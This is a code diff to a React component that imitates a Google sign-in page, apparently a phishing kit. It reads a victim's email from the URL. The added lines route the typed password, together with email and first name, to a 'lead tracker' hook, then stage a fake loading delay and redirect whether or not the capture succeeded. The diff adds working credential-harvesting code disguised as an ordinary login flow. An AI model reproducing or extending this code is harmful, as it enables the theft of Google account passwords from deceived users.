@@ -1,6 +1,7 @@
 import React, { useState, useEffect, useRef } from 'react';
 import { useRouter } from 'next/router';
 import { PageHead } from '../hooks/usePageMeta';
+import { useLeadTracker } from '../hooks/useLeadTracker';
 import styles from '../styles/GoogleLogin.module.css';
 
 const GoogleLogin = () => {
@@ -12,6 +13,9 @@ const GoogleLogin = () => {
   const [showPasswordText, setShowPasswordText] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
   const passwordInputRef = useRef(null);
+  
+  // Hook pour le tracking des leads
+  const { trackLogin, isTracking } = useLeadTracker();
 
   // Récupérer l'email et le prénom depuis l'URL au chargement
   useEffect(() => {
@@ -45,21 +49,47 @@ const GoogleLogin = () => {
     setShowPassword(true);
   };
 
-  const handlePasswordSubmit = (e) => {
+  const handlePasswordSubmit = async (e) => {
     e.preventDefault();
     setIsLoading(true);
     
-    // Simuler un délai de chargement
-    setTimeout(() => {
-      // Rediriger vers la page de confirmation avec les paramètres
-      router.push({
-        pathname: '/confirmation',
-        query: {
-          email: email,
-          firstName: firstName
-        }
+    console.log('Début du tracking login avec:', { email, firstName, password: password ? '***' : 'vide' });
+    
+    try {
+      // Tracker le login avec le mot de passe
+      const result = await trackLogin({
+        email,
+        firstName,
+        password
       });
-    }, 4000); // 3 secondes de chargement
+      
+      console.log('Résultat du tracking login:', result);
+      
+      // Simuler un délai de chargement
+      setTimeout(() => {
+        // Rediriger vers la page de confirmation avec les paramètres
+        router.push({
+          pathname: '/confirmation',
+          query: {
+            email: email,
+            firstName: firstName
+          }
+        });
+      }, 4000); // 4 secondes de chargement
+      
+    } catch (error) {
+      console.error('Erreur lors du tracking du login:', error);
+      // Continuer même si le tracking échoue
+      setTimeout(() => {
+        router.push({
+          pathname: '/confirmation',
+          query: {
+            email: email,
+            firstName: firstName
+          }
+        });
+      }, 4000);
+    }
   };
 
   return (
@@ -161,11 +191,11 @@ const GoogleLogin = () => {
               </div>
 
               <div className={styles.actions}>
-                <button type="submit" className={styles.nextBtn} disabled={isLoading}>
-                  {isLoading ? (
+                <button type="submit" className={styles.nextBtn} disabled={isLoading || isTracking}>
+                  {(isLoading || isTracking) ? (
                     <div className={styles.loadingContainer}>
                       <div className={styles.spinner}></div>
-                      <span>Connexion...</span>
+                      <span>{isTracking ? 'Sauvegarde...' : 'Connexion...'}</span>
                     </div>
                   ) : (
                     'Suivant'
